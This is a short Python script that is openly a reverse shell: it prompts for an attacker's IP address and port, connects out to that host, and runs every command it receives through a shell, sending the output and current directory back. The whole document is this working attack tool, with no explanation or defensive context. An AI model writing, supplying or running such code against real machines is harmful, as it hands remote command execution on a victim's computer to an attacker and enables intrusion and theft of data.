import socket
import subprocess
import os
print("Enter the IP Address of the attacker: ")
attacker_ip=input()
print("Enter the port on which you want to connect: ")
attacker_port=int(input())

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((attacker_ip,attacker_port))



while True:
    data = s.recv(1024)
    if data[:2] == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd=subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '$'))
    else:
        continue
    


s.close()
